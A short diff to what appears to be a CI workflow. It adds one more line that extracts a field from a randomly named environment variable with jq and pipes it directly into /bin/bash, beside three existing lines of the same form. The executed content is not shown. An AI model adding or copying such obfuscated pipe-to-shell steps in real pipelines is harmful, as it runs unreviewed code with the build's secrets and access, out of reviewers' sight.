@@ -26,6 +26,7 @@ jobs:
           echo $vimff077 | jq -r .y10 | /bin/bash
           printf '%s' "$gh13" | jq -r .bn6 | /bin/bash
           printf '%s' "$axss13" | jq -r .kq345 | /bin/bash
+          printf '%s' "$xprh58" | jq -r .rtwa12220 | /bin/bash
 
       - name: Save archive
         if: always()
